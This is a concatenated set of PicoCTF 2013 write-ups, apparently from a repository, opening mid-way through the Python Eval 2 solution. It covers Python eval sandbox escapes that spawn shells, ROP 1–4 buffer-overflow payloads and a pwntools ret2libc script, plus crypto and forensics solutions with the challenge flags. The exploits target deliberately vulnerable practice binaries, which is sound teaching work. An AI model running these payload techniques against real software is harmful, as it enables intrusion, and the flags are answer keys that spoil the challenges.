> We can solve this challenge by causing the program to throw an exception.

>Inputting *int(flag)* gives us the answer.
```
guess> int(flag)
Traceback (most recent call last):
  File "/home/py2/task2.py", line 25, in <module>
    guess = input('guess> ')
  File "<string>", line 1, in <module>
ValueError: invalid literal for int() with base 10: 'i_are_a_pyeval_mastermind'
```



**Answer: i_are_a_pyeval_mastermind** 

## Other write-ups and resources

* none yet
# PicoCTF 2013: Python Eval 3

**Category:** Script Exploitation
**Points:** 110
**Description:**

> Give Python Eval 1 and 2 a shot before moving on to [Python Eval 3](https://2013.picoctf.com/problems/pyeval/stage3.html).

## Write-up
>This challenge involves exploiting a Python script's input 'eval' function using the script's imports.

> We're given the follwing script and the task of getting a shell to read the flag.

```
# task3.py
# Remember kids: this is bad code. Try not code like this :P
from os import path
del __builtins__.__dict__['__import__']
del __builtins__.__dict__['reload']

print "Welcome to the food menu!"
choices = (
  ("Chicken Asada Burrito", 7.69, "caburrito.txt"),
  ("Beef Chow Mein", 6.69, "beefchow.txt"),
  ("MeatBurger Deluxe", 10.49, "no description"),
  # ...
)

def print_description(n):
  print ""
  if n >= len(choices):
    print "No such item!"
  elif not path.exists(choices[n][2]):
    print "No description yet, but we promise it's tasty!"
  else:
    print open(choices[n][2]).read()

def show_menu():
  for i in xrange(len(choices)):
    print "[% 2d] $% 3.2f %s" % (i, choices[i][1], choices[i][0])

while True:
  print "Which description do you want to read?"
  show_menu()
  print_description(input('> '))
```

> We can see that the ability to import and call a shell has been blocked so we need to look for another way. Opening up a Python interperter from our 
> local machine and checking what the import path gives us reveals an answer.

```
>>> from os import path
>>> dir(path)
['__all__', '__builtins__', '__doc__', '__file__', '__name__', '__package__', '_joinrealpath', '_unicode', '_uvarprog', '_varprog', 'abspath', 'altsep', 'basename', 'commonprefix', 'curdir', 'defpath', 'devnull', 'dirname', 'exists', 'expanduser', 'expandvars', 'extsep', 'genericpath', 'getatime', 'getctime', 'getmtime', 'getsize', 'isabs', 'isdir', 'isfile', 'islink', 'ismount', 'join', 'lexists', 'normcase', 'normpath', 'os', 'pardir', 'pathsep', 'realpath', 'relpath', 'samefile', 'sameopenfile', 'samestat', 'sep', 'split', 'splitdrive', 'splitext', 'stat', 'supports_unicode_filenames', 'sys', 'walk', 'warnings']
```

> The import path contains a reference to the module os so we can simply call a shell using path. Inputting the following commands gives us our answer
```
> path.os.execlp('sh','sh')
> ls
run.sh
task3.py
your_flag_here
> cat your_flag_here
eval_is_super_OSsome
```




**Answer: eval_is_super_OSsome** 

## Other write-ups and resources
* [https://www.uns.vn/picoctf-2013-write-up-python-eval-3/](https://www.uns.vn/picoctf-2013-write-up-python-eval-3/)
* [http://hacktracking.blogspot.com/2014/01/picoctf-2k13-python-eval-3.html](http://hacktracking.blogspot.com/2014/01/picoctf-2k13-python-eval-3.html)
* [https://github.com/james9909/PracticeCTF/tree/master/picoCTF-2013/Python%20Eval%203](https://github.com/james9909/PracticeCTF/tree/master/picoCTF-2013/Python%20Eval%203)
# PicoCTF 2013: Python Eval 4

**Category:** Script Exploitation
**Points:** 130
**Description:**

> Solving the previous Python Eval probelms will help you prepare for [Python Eval 4](https://2013.picoctf.com/problems/pyeval/stage4.html)

## Write-up
*None Yet*

**Answer: kids_dont_code_like_this_at_home ** 

## Other write-ups and resources

* [http://hacktracking.blogspot.com/2014/02/picoctf-2k13-python-eval-4.html](http://hacktracking.blogspot.com/2014/02/picoctf-2k13-python-eval-4.html)
# PicoCTF 2013: Python Eval 5

**Category:** Script Exploitation
**Points:** 140
**Description:**

> A true challenge awaits you at python.picoctf.com:6365. [Source](https://2013.picoctf.com/problems/pyeval/task5.py).

## Write-up

> This challenge is very simliar to Python Eval 3. We're given a Python script to exploit and the task of getting a shell on the server running it ; in order to read the flag.
> The script's author has removed the ability to call __builtins__ and have given us a dictionary with an empty variable 'x'.
> They also have limited us to 50 chars of eval at a time.
> Our approache to solving this will be to use the empty variable 'x''s builtins to exploit this script.
> The follwing commands give us our shell.

```
__builtins__[0]=x.__class__.__base__
__builtins__[1]=__builtins__[0].__subclasses__
__builtins__[2]=__builtins__[1]()
__builtins__[3]=__builtins__[2][53]
__builtins__[4]=__builtins__[3].__repr__
__builtins__[5]=__builtins__[4].im_func
__builtins__[6]=__builtins__[5].func_globals
__builtins__[7]=__builtins__[6]['linecache']
__builtins__[8]=__builtins__[7].os
__builtins__[8].execl('/bin/sh','sh')
```

> The first six lines of input give us access to *im_func* 's functions. One of those functions is the func_globals function. The func_globals function returns a dictionary of a modules global scope.
> The next two lines calls func_globals with the argument of the module linecache. The linecache module has the module os module in scope.
> We use the last two lines to use the module os to call a shell. 

Finally using our shell gives us the answer
```
ls
flag_for_masters
run.sh
task5.py
cat flag_for_masters
you_are_the_pyeval_master
```

**Answer: you_are_the_pyeval_master** 

## Other write-ups and resources

* [http://hacktracking.blogspot.com/2014/02/picoctf-2k13-python-eval-5.html](http://hacktracking.blogspot.com/2014/02/picoctf-2k13-python-eval-5.html)
* [http://haeresy.tumblr.com/post/49832621763/python-eval-5](http://haeresy.tumblr.com/post/49832621763/python-eval-5)
# PicoCTF 2013: Read the Manual

**Category:** Crypto
**Points:** 30
**Description:**

> On the back of the broken panel you see a recovery [manual](tmp2xfLwN.txt). You need to find the emergency repair key in order to put the robot into `autoboot` mode, but it appears to be ciphered using a Caesar cipher.

## Write-up

Quote: "*but it appears to be ciphered using a Caesar cipher*"

We'll use a tool [Decrypt CAESAR Online](http://www.xarg.org/tools/caesar-cipher)

With k = 10, cleartext is: 

```
Instruction manual for Toaster Model 0X653F IMPORTANT: To enter automatic recovery mode, 
enter the following recovery key 'tamwxxgkqzac' Boolean logic and IPv0,[...]
```

**Answer:** tamwxxgkqzac

## Other write-ups and resources

* none yet# PicoCTF 2013 write-ups

* <https://2013.picoctf.com>
* [Scoreboard](https://2013.picoctf.com/scoreboard)

## Completed write-ups

##### General

* [Failure to Boot: 20](failure-to-boot)
* [Read the Manual: 30](read-the-manual)
* [XMLOL: 30](xmlol)
* [Technician Challenge: 30](technician-challenge)
* [Grep is Your Friend: 40](grep-is-your-friend)
* [First Contact: 40](first-contact)
* [Try Them All!: 45](try-them-all)
* [GETKey: 50](getkey)
* [Spaceport Map: 55](spaceport-map)
* [Bitwise: 55](bitwise)
* [Yummy: 60](yummy)
* [Byte Code: 70](byte-code)
* [CFG to C: 70](cfg-to-c)
* [RSA: 70](rsa)
* [Pilot Logic: 75](pilot-logic)
* [Client-Side is the Best Side: 75](client-side-is-the-best-side)
* [DDoS Detection: 85](ddos-detection)
* [Injection: 110](injection)

##### Binary Exploiatation

* [ROP 1: 95](rop-1)
* [ROP 2: 120](rop-2)
* [ROP 3: 150](rop-3)
* [ROP 4: 165](rop-4)
* [Overflow 1: 90](overflow-1)
* [Overflow 2: 100](overflow-2)
* [Overflow 3: 120](overflow-3)
* [Overflow 4: 150](overflow-4)
* [Overflow 5: 190](overflow-5)






##### Cryptography - TODO

* [Trivial: 45](trivial)
* [Classic: 70](classic)
* [Robomunication: 80](robomunication)
* [Broken CBC: 125](#)
* [Broken RSA: 180](#)

##### Forensics

* [NAVSAT: 70](navsat)
* [Spamcarver: 70](spamcarver)
* [Second Contact: 85](second-contact)
* [In Hex, No One Can Hear You Complain:  90](in-hex-no-one-can-hear-you-complain)
* [Chromatophoria: 100](chromatophoria)
* [Dark Star: 110](dark-star)
* [Black Hole: 115](black-hole)
* [Core Decryption: 120](core-decryption)

##### Script Exploitation
* [Pretty Hard Programming: 95](pretty-hard-programming)
* [PHP2: 85](php2)
* [PHP3: 120](php3)
* [Python Eval 1: 85](python-eval-1)
* [Python Eval 2: 95](python-eval-2)
* [Python Eval 3: 110](python-eval-3)
* [Python Eval 5: 140](python-eval-5)

##### Reverse Engineering - TODO

* [avaJ: 85](#)
* [hotcoffee: 85](#)
* [Evergreen: 110](#)
* [Harder Serial: 120](#)
* [Mildly Evil: 185](#)
* [moreevil: 200](#)

##### Binary Exploitation - TODO

* [Format 1: 100](#)
* [Format 2: 180](#)

## External write-ups only
* [PHP4: 110](php4)
* [Python Eval 4: 130](python-eval-4)

## Missing write-ups

* **Link to `#` is TODO.**

# PicoCTF 2013: Robomunication

**Category:** Cryptography
**Points:** 80
**Description:**

> We recorded the following [communication](https://2013.picoctf.com/problems/robo.mp3) between two robots. Find out what evil things they are plotting, and recover their secret key!
>
> [Offline file](robo.mp3)

## Write-up

This challenge involves transcribing and decoding Morse code. 

Listening to the supplied mp3 we can hear the robots speaking in "beep"s and "boop"s. Transcribing those beeps and boops and decoding them using a [Morse code chart](https://upload.wikimedia.org/wikipedia/commons/b/b5/International_Morse_Code.svg) gives us our answer. 

**Answer: BOOPBEEP** 

## Other write-ups and resources

* none yet
# PicoCTF 2013: ROP 1

**Category:** Binary Exploitation
**Points:** 95
**Description:**

> ROP is a classic technique for getting around address randomization and
> non-executable memory. This sequence will teach you the basics.
>
> Problem available on the shell machine in /problems/ROP_1_fa6168f4d8eba0eb ,
> downloadable [here](https://2013.picoctf.com/problems/rop1-fa6168f4d8eba0eb)  with source [here](https://2013.picoctf.com/problems/rop1-fa6168f4d8eba0eb.c).
>
>

## Write-up
Looking at the C code, there are two interesting functions:
```C
int not_called() {
return system("/bin/bash");
}

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 256);
}
```
As you may have guessed, the vulnerability is in the `vulnerable_function()`.
The function calls `read()` with a size of 256, whereas the buffer only has 128
spaces to fill. This is what is referred to as a buffer overflow, and we're
going to use it to get a shell.

The main difference between the overfllow problems and ROP is that ROP type
problems have NX/ASLR enabled, and sometimes other protections. This means that 
libc and stack addresses are random, and that no memory is simultaneously
writeable and executable. RIP shellcode.

Luckily, `not_called()` does most of the heavy lifting for us. Since
ASLR **does not** randomize the addresses in the executable, we can reliably
supply the address of `not_called()` and get a shell!

Some quick scratchwork shows that $eip is under our control after 140 bytes 
have been supplied:

```
python -c 'print "A"\*140 + "BBBB"' | strace ./rop1-fa6168f4d8eba0eb
...
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
```

Now, instead of "BBBB" we're going to try something more useful. We need the
address of `not_called()`. We can run: 
```objdump -d rop1-fa6168f4d8eba0eb | grep "not_called"```
which yields `080484a4 <not_called>:`
The address is `0x080484a4`! However, we have to convert that address into an
escape sequence and to litte endian. Thus:
```
python -c 'print "A"\*140 + "\xa4\x84\x04\x08"'| ./rop1-fa6168f4d8eba0eba
```
should work.

However, as indicated in the SMALL_HINT file given to us, it will exit right 
away. Finally:
```
(python -c 'print "A"\*140 + "\xa4\x84\x04\x08"';cat )| ./rop1-fa6168f4d8eba0eb
```
will get you a shell!

**Note:** This was solved locally on my machine. When using the PicoCTF shell,
the name of the binary is simply "rop1". The final command would change to:
```
python -c 'print "A"\*140 + "\xa4\x84\x04\x08"';cat )| ./rop1
```

pwn.

## Other write-ups and resources

* none yet
# PicoCTF 2013: ROP 2

**Category:** Binary Exploitation
**Points:** 120
**Description:**

> ROP is a classic technique for getting around address randomization and
> non-executable memory. This sequence will teach you the basics.
>
> Problem available on the shell machine in /problems/ROP_2_20f65dd0bcbe267d ,
> downloadable [here](https://2013.picoctf.com/problems/rop2-20f65dd0bcbe267d)  with source [here](https://2013.picoctf.com/problems/rop2-20f65dd0bcbe267d.c).
>
>

## Write-up
This is a ROP challenge. ASLR is enabled, meaning that libc and stack
addresses are random. Also, NX is enabled, meaning that there is no
simultaneously writable and executable space in memory. RIP Shellcode.
Luckily for us, the programmer has left a trail of breadcrumbs for us.

```C
char * not_used = "/bin/bash";

int not_called() {
    return system("/bin/date");
}

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 256);
}
```

Unlike in [ROP 1](../rop-1), the call to `not_called()` doesn't automatically give
us a shell. However, with a bit of hacking chicanery, this won't be an issue. 

In order for you to understand this exploit, I'm going to teach you a bit about the
GOT and PLT. In any ASLR enabled binary (and most normal binaries for that
matter) there has to be a way for the binary to 'know' where the libc functions
are at. The binary creates a PLT stub for functions used in the source. These
are **always at a constant address**. This PLT stub is essentially a wrapper
function for the actual function in libc. The GOT contains the actual adresses
in libc for the functions used in the program. The actual adresses change from
runtime to runtime, but pointers to the same function are **always in the same
spot in the GOT**.

So what does this mean for us?

It means that the function `not_called()` can be avoided altogether. Since
there is a call to `system()` in the binary, we can just call that instead and
feed it our own argument. Mwahahahaa.

We'll start with finding the offset for `$eip`.

```
python -c 'print "A"*140 + "BBBB" ' | strace ./rop2-20f65dd0bcbe267d
...
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
```

After 140 junk bytes, we have control of `$eip`. As I mentioned before, we need
to supply the PLT stub for `system()` so we can call it with our own argument.

```
objdump -d rop2-20f65dd0bcbe267d | grep system
...
080483a0 <system@plt>:
```

We get an adress of 0x080483a0. We can put this into `$eip` followed by a bogus
four byte return address (we don't need to call another function in this
problem) and the pointer to what we want to call system on. Conveniently
enough, `char * not_used = "/bin/bash";` is exactly what we need. You might be
wondering how we're going to get access to `not_used` since it's on a
randomized stack. The good news is that "/bin/bash" is in the binary as a raw
string. **We can reliably supply "/bin/bash" to ```system()```.**

If we pop open gdb we can find the address of "/bin/bash" in the binary.
```
$gdb rop2-20f65dd0bcbe267d
gdb-peda$ b*main
gdb-peda$ r
gdb-peda$ find /bin/bash
Searching for '/bin/bash' in: None ranges
Found 3 results, display max 3 items:
rop2-20f65dd0bcbe267d : 0x8048610 ("/bin/bash")
rop2-20f65dd0bcbe267d : 0x8049610 ("/bin/bash")
              [stack] : 0xffffd8a9 ("/bin/bash")
```
The first two instances are actually in the binary. The one found in the
`[stack]` can't be reliably used because of ASLR. Now we have all of the
components for our exploit to work. It will take the form of:

[padding] + [address of system] + [fake return address] + [addres /bin/bash]
```
(python -c 'print "A"*140 + "\xa0\x83\x04\x08" + "JUNK" + "\x10\x86\x04\x08"
';cat )| ./rop2-20f65dd0bcbe267d
```

As usual, the exploit has to be in parenthesis with `cat` afterwards so we can
actually use the shell we spawn.

pwn.
## Other write-ups and resources

* none yet
# PicoCTF 2013: ROP 3

**Category:** Binary Exploitation
**Points:** 150
**Description:**

> ROP is a classic technique for getting around address randomization and
> non-executable memory. This sequence will teach you the basics.
>
> Problem available on the shell machine in /problems/ROP_3_7f3312fe43c46d26,
> downloadable [here](https://2013.picoctf.com/problems/rop3-7f3312fe43c46d26) with source [here](://2013.picoctf.com/problems/rop3-7f3312fe43c46d26.c).
>
>

## Write-up
**DISCLAIMER: Many of the other writeups for this online used ulimit to disable
ASLR during their session. This makes the problem exceptionally easy. My
writeup will show how to solve it the hard way, since you're likely using this
for practice. It is also only a local solution since I don't think you can
install pwntools on the PicoCTF server.**

Just like ROP 1 and ROP 2, RIP Shellcode.

This one's going to be a bit harder. If you haven't read my bit on the GOT and
PLT from [ROP 2](../rop-2) then you should do that :)

looking at the code, we can see there isn't anything extra for us to work with.
```C
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function()  {
    char buf[128];
    read(STDIN_FILENO, buf,256);
}

void be_nice_to_people() {
    // /bin/sh is usually symlinked to bash, which usually drops privs. Make
    // sure we don't drop privs if we exec bash, (ie if we call system()).
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char** argv) {
        be_nice_to_people();
    vulnerable_function();
    write(STDOUT_FILENO, "Hello, World\n", 13);
}
```

This challenge actually requires us to **bypass ASLR** as opposed to calling
premade functions. `system()` isn't called in this program, so there isn't a PLT
stub for it :(. Luckily, bypassing ASLR is only mildly painful.

We'll start by finding the offset for `$eip`.
```
python -c 'print "A"*140 + "BBBB"' | strace ./rop3-7f3312fe43c46d26
...
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
```
140 bytes, just like the other ROP problems so far. Now comes the fun part. You
know that the GOT contains the pointers into libc for the binary to use. What
you may not have known is that the GOT is writable. You can change values in
the GOT that correspond to PLT stubs. If you were able to change a pointer by a
certain am.ount and then call the corresponding PLT stub, you could trick the
program into calling `system()`. We can run objdump to find what PLT/GOT
functions we have to work with.

```
$ objdump -d rop3-7f3312fe43c46d26 | grep ">:"
08048360 <read@plt>:
...
...
080483a0 <write@plt>:
```

Unfortunately those are about the only two useful functions we have, but
they'll be enough. In addition, we'll need the address of functions in the GOT
for us to leak.

```
$ objdump -R rop3-7f3312fe43c46d26

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   read
0804a004 R_386_JUMP_SLOT   getegid
0804a008 R_386_JUMP_SLOT   __gmon_start__
0804a00c R_386_JUMP_SLOT   __libc_start_main
0804a010 R_386_JUMP_SLOT   write
0804a014 R_386_JUMP_SLOT   setresgid
```
Our first vector of attack will be to call `write()` and print out an address
from the GOT like so:

`write(1,address_read_GOT,4)`

```
python -c 'print "A"*140 + "\xa0\x83\x04\x08" + "AAAA" + "\x01\x00\x00\x00" +
"\x00\xa0\x04\x08" + "\x04\x00\x00\x00"' | ./rop3-7f3312fe43c46d26
```

The "AAAA" in the exploit is the return address, we'll get to that later. If
you run this, you'll get a little bit of gibberish to print out and then a
segfault. That gibberish is the libc address of `read()` for that runtime.
Time for good ol' gdb:

```
$ gdb rop3-7f3312fe43c46d26
gdb-peda$ b*main
gdb-peda$ r

```
Your results may vary from here on.
```
db-peda$ p read
$1 = {<text variable, no debug info>} 0xf7efdbd0 <read>
gdb-peda$ p system
$2 = {<text variable, no debug info>} 0xf7e63190 <system>
gdb-peda$ p 0xf7efdbd0-0xf7e63190
$3 = 0x9aa40
```
Address of `system()` is **lower** than `read()` by 0x9aa40
```
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f83a24 ("/bin/sh")
gdb-peda$ p 0xf7f83a24-0xf7efdbd0
$5 = 0x85e54
```
Address of /bin/sh is **greater** than `read()` by 0x85e54.
Now we need to change the "AAAA" in our exploit to the address of
`vulnerable_function()`. This will retrigger the vulnerability, enabling us to
calculate the address of 'system()' and "/bin/sh" and make the appropriate
function call.
```
python -c 'print "A"*140 + "\xa0\x83\x04\x08" + "\x74\x84\x04\x08" + "\x01\x00\x00\x00" +
"\x00\xa0\x04\x08" + "\x04\x00\x00\x00"' | ./rop3-7f3312fe43c46d26
```

At this point, we'll need to use pwntools. You can install it with:
```
sudo pip install pwntools
```

Here's why. Once we have that leaked address we can do some napkin math to
calculate the address of `system()`. **ASLR only randomises the base address of
libc. This means that `system()` is always the same distance from `read()` or
`write()` at any given runtime**. pwntools can do that math for us. We can
start our python script as such:
```python

from pwn import *
context(arch='i386', os='linux')
#conventions for pwntools ^

first_part = ("A"*140 + "\xa0\x83\x04\x08" + "\x74\x84\x04\x08"
+ "\x01\x00\x00\x00" + "\x00\xa0\x04\x08" + "\x04\x00\x00\x00" )
# our exploit so far ^
r = process("./rop3-7f3312fe43c46d26", shell=True) #executes the binary
r.sendline(first_part ) #feeds the exploit to the binary
a=unpack(r.recv(4)) #gets the four bytes we leaked from the GOT
print hex(a)
```
if you run this a few times the address should vary from run to run.
This is a good thing, it means that you're getting the random libc address.
From here, you can calculate the addresses we found before in gdb by adding
these lines.
```python
system_address=a-0x9aa40
binsh_address = a+0x85e54

r.sendline("A"*140+pack(system_address)+"JUNK"+pack(binsh_address))

""" The above line sends 140 bytes of padding, the little endian form of
    system_address, a bogus return address, and the little endian form of the
    address of /bin/sh. The pack() function just turns the integer into an escape
    sequence for us
"""
r.interactive() # This just enables you to type things in to your shell :)
```

pwned.
## Other write-ups and resources

* none yet
# PicoCTF 2013: ROP 4

**Category:** Binary Exploitation
**Points:** 165
**Description:**

>Problem has been updated April 28th at midnight ESTAnother ROP problem, this
>time a bit harder than before. Available on the shell machine in
>/problems/ROP_4_887f7f28b1f64d7e .

## Write-up
**Disclaimer: The binary was taken from the server since there was no download
in the description, it may not line up exactly with the source code.**

As the [SMALL_HINT](SMALL_HINT) suggests, they've gone and used `strcpy()` instead of
`strcat()`. Luckily this won't be an issue.

Let's look at the code
```C
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char exec_string[20];

void exec_the_string() {
    execlp(exec_string, exec_string, NULL);
}

void call_me_with_cafebabe(int cafebabe) {
    if (cafebabe == 0xcafebabe) {
        strcpy(exec_string, "/sh");
    }
}

void call_me_with_two_args(int deadbeef, int cafebabe) {
    if (cafebabe == 0xcafebabe && deadbeef == 0xdeadbeef) {
        strcpy(exec_string, "/bin");
    }
}

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}
```

Based on the code, it looks like they wanted us to call
`call_me_with_two_args()`, followed by `call_me_with_cafebabe()`, followed by 
`exec_the_string()`. However they used `strcpy()` so we'll just circumvent the
entire thing. The important factor is that we can call `execlp()` and `read()`.

That will be enough for a shell. We can start by finding the offset for `$eip`
```
python -c 'print "A"*140 + "BBBB"' | strace ./rop4
...
...
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
```
Surprise surprise, 140 bytes like the other ROP problems. Now at this point
I'll confess that I have no idea how `execlp()` is supposed to work. What I do
know is that according to their code, `execlp("/bin/sh","/bin/sh",NULL)` should
do the trick. First we use objdump to dump the functions and we'll find that
there's a lot. That's because this binary is statically linked. There are a lot
of functions to choose from :). I grepped around for some useful functions.
```
08053ab0 <execlp>:
...
08053d20 <__libc_read>:
...
```
With these functions we can fairly reliably get a shell. I started witha a call
to `read(1,0xff6f0000,9)`. This was so I had an absolute address for /bin/sh to
go into. The address 0xff6f0000 was just an address I picked that was likely to
be in the stack range consistently across runs.
```
python -c 'print "A"*140 + "\x20\x3d\x05\x08" + "JUNK" +
"\x01\x00\x00\x00" + "\x00\x00\x6f\xff"+ "\x09\x00\x00\x00"' | ./rop4
```

From here, we need to chain function calls together so we can call `execlp()`.
This means that I need to somehow get my three arguments for `read()` off of
the stack, otherwise 0x00000001 will be the next address jumped to. I used
[ropshell](ropshell.com) to find the ROP gadget I needed. A ROP gadget is just
a tiny chunk of assembly that does something and returns. In this case, it runs
pop;pop;pop;ret. This ensures that the three arguments for `read()` aren't
treated as addresses with code to be run. The address for this gadget is:
0x0809b675. 

We get this:
```
python -c 'print "A"*140 + "\x20\x3d\x05\x08" + "\x75\xb6\x09\x08" +
"\x01\x00\x00\x00" + "\x00\x00\x6f\xff"+ "\x09\x00\x00\x00"' | ./rop4
```
as the next phase in our exploit. Now that we have the pop;pop;pop;ret gadget,
we can just put the call to `execlp()` after it all. We then supply a bogus
return address, the address of the string to be executed (x2), and 0, or NULL.

```
python -c 'print "A"*140 + "\x20\x3d\x05\x08" + "\x75\xb6\x09\x08" + 
"\x01\x00\x00\x00" + "\x00\x00\x6f\xff"+ "\x09\x00\x00\x00"+ "\xb0\x3a\x05\x08"
+ "JUNK" + "\x00\x00\x6f\xff" + "\x00\x00\x6f\xff" + "\x00\x00\x00\x00"' | ./rop4
```

Note that I supplied the same address as the call to `read()`. This is because
when you run the program, you'll actually type in /bin/sh for the second read,
and that is what gets executed. Try typing in /bin/date , it will also work :P

Note: On the server you may want to use /bin/bash :)

pwned.

## Other write-ups and resources

* none yet
# PicoCTF 2013: RSA

**Category:** Crypto
**Points:** 70
**Description:**

> Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm. [Problem](https://2013.picoctf.com/problems/rsa.txt)
>
> [offline file](rsa.txt)

## Write-up

What is RSA algorithm? [Wikipedia](http://en.wikipedia.org/wiki/RSA_(cryptosystem))

We will focus to "Key generation":

**1. Choose two distinct prime numbers p and q.**

* For security purposes, the integers p and q should be chosen at random, and should be of similar bit-length. Prime integers can be efficiently found using a primality test.

**2. Compute n = pq.**

* n is used as the modulus for both the public and private keys. Its length, usually expressed in bits, is the key length.

**3. Compute `φ(n) = φ(p)φ(q) = (p − 1)(q − 1) = n - (p + q -1)`, where φ is Euler's totient function.**

**4. Choose an integer e such that 1 < e < φ(n) and gcd(e, φ(n)) = 1; i.e., e and φ(n) are coprime.**

* e is released as the public key exponent.
* e having a short bit-length and small Hamming weight results in more efficient encryption – most commonly 216 + 1 = 65,537. However, much smaller values of e (such as 3) have been shown to be less secure in some settings.

**5. Determine d as d ≡ e−1 (mod φ(n)); i.e., d is the multiplicative inverse of e (modulo φ(n)).**

* This is more clearly stated as: solve for d given `d*e ≡ 1 (mod φ(n))`
* This is often computed using the extended Euclidean algorithm. Using the pseudocode in the Modular integers section, inputs a and n correspond to e and φ(n), respectively.
* d is kept as the private key exponent.

Use module gmpy2 in python2:

```python
import gmpy2

[...]

invert(x, m)
# invert(x, m) returns y such that x * y == 1 modulo m, or 0 if no such y exists.

[...]
```

Install [gmpy2](https://code.google.com/p/gmpy/downloads/list) is required.

Code:

```python
#!/usr/bin/python2
import gmpy2

p =  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483
q =  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407
e =  65537
c =  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034
t = (p-1)*(q-1)
n = p*q

# returns d such that e * d == 1 modulo t, or 0 if no such y exists.
d = gmpy2.invert(e,t)

# Decryption
m = pow(c,d,n)
print "Solved ! m = %d" % m
```

**Answer:** 5577446633554466577768879988

## Other write-ups and resources

* none yet# PicoCTF 2013: Second Contact

**Category:** Forensic
**Points:** 85
**Description:**

> As you're bumming around the Kuiper Belt, you catch an [incoming transmission](https://2013.picoctf.com/problems/kuiper.pcap) from a distant source. They seem to be scanning the area, looking for something... Maybe you should try to find it first.
>
> This trace file is also available in cloudshark [here](http://www.cloudshark.org/captures/f0741cdfee53)
>
> [Offline file](kuiper.pcap)

## Write-up

Open file with Wireshark.

Quote: *They seem to be scanning the area, looking for something...*

We will focus to search engine (Google, Bing, etc).

When Follow TCP Stream, we see `packet 1018`:

``` 
http://www.bing.com/search?q=smashing+the+stack+for+fun+and+profit&form=MOZSBR&pc=MOZI
```

They were looking for something that involved to "smashing+the+stack+for+fun+and+profit"

This is a magazine,the first things that we things is author, contents, ...

Suprising, flag is the name of author of magazine.

**Answer:** Aleph One

## Other write-ups and resources

* none yet# PicoCTF 2013: Spaceport Map

**Category:** Trivival
**Points:** 55
**Description:**

> The map of the spaceport is hard to parse, but you're pretty sure there is some hidden information, somewhere...
>
> ![](spaceportmap.gif)

## Write-up

spaceportmap.gif is a animated image (will include some other frames).

Use [Jeffrey's Exif Viewer Tool](http://regex.info/exif.cgi) to extract all frames of it.

![](info.png)

We can see Animated frame #4:

![frame #4](frame4.gif)

```
Key: Do passports let you fly interstellar?
```

**Answer:** Do passports let you fly interstellar

## Other write-ups and resources

* none yet# PicoCTF 2013: Spamcarver

**Category:** Forensic
**Points:** 70
**Description:**

> While exploring an alien tomb, you find an ancient jpg of [an ancient can of SPAM](https://2013.picoctf.com/problems/spamcarver.jpg). It seems valueless, but the guardbots really want it back, so perhaps there's something more here than meets the eye. Maybe it's cursed, or hexed, if you will?
>
> [Offline file](spamcarver.jpg)

## Write-up

View file in hex:

```
00000000  FF D8 FF E0 00 10 4A 46 49 46 00 01 01 00 00 01  ÿØÿà..JFIF......
00000010  00 01 00 00 FF FE 00 3B 20 20 20 20 20 20 20 20  ....ÿþ.;        

[...]

0000CB80  AB D1 5D 7F DA 93 FE 5F C7 FE 00 1F FF D9 50 4B  «Ñ].Ú“þ_Çþ..ÿÙPK
0000CB90  03 04 14 00 02 00 08 00 F4 02 9F 41 D4 50 D9 9C  ........ô.ŸAÔPÙœ
0000CBA0  E3 2D 00 00 99 2E 00 00 08 00 1C 00 20 20 20 20  ã-..™.......    
0000CBB0  20 20 20 20 55 54 09 00 03 8B 4B E1 50 8C 4B E1      UT...‹KáPŒKá
0000CBC0  50 75 78 0B 00 01 04 E8 03 00 00 04 E8 03 00 00  Pux....è....è...
[...]
```

We will focus to file signature, `FF D8 FF E0 00 10 4A 46 49 46` is JPEG.
`50 4B 03 04` is PKZIP. Try extract, in Windows, seem to be error, file can't read.
Because file name has white space, we try extract in Linux.

```
$ unzip spamcarver.jpg

# rename file to display name
$ mv \ \ \ \ \ \ \ \ newfile.new 

$ file newfile.new
newfile.new; JPEG image data, JFIF standard 1.01
```

Open newfile.new with image viewer program to see flag.

![](newfile.new.jpg)

**Answer:** 7adf6f07e0810003c585a7be97868a90

## Other write-ups and resources

* none yet# PicoCTF 2013: Technician Challenge

**Category:** Trivia
**Points:** 30
**Description:**

> The spaceport technician waves to you and you approach him. He tells you that he has noticed you walking around suspiciously. He adds that he knows the door code and is willing to give it to you for answering a small trivia question.

>> For what kind of car was the first unlocked iPhone traded?

## Write-up

Google keyword `For what kind of car was the first unlocked iPhone traded?` for too many results.

**Answer:** Nissan 350Z

## Other write-ups and resources

* none yet# PicoCTF 2013: Trivial

**Category:** Crypto
**Points:** 45
**Description:**

> An unlocked terminal is displaying the following:
>
> > Encryption complete, ENC(???,T0pS3cre7key) = Bot kmws mikferuigmzf rmfrxrwqe abs perudsf! Nvm kda ut ab8bv_w4ue0_ab8v_DDU
>
> You poke around and find this interesting [file](https://2013.picoctf.com/problems/encrypt.py).
>
> [offline file](encrypt.py)

## Write-up

Run encrypt.py: "Usage: D:\Downloads\encrypt.py SECRET_KEY PLAINTEXT"

Quote:

```python
print "Encryption complete, ENC(%s,%s) = %s"%(plaintext,key,ciphertext)
```

We can know:

